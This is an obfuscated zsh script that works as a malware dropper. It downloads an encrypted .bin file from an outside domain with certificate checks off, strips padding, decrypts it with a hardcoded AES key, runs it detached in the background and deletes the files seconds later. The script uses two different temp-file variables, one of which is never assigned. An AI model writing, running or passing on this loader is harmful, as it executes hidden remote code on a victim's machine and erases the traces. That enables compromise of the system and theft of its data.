#!/bin/zsh
ct6wm=$(mktemp /tmp/r7f65b.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/me76fe2fbaf444293.bin" -o "$ct6wmz" || exit 1
rshm82=$(stat -f %z "$ct6wmz"); mshfkdu=$(( rshm82 - 2546 - 3473 ))
tail -c +$(( 2546 + 1 )) "$ct6wmz" | head -c $mshfkdu | openssl enc -d -aes-256-cbc -k afb7c1184587f71f3f98df7f -out "$ct6wm" 2>/dev/null
[ -s "$ct6wm" ] && chmod 700 "$ct6wm" && ( "$ct6wm" & ) && disown
( sleep 3; rm -f "$ct6wm" "$ct6wmz" ) &>/dev/null &
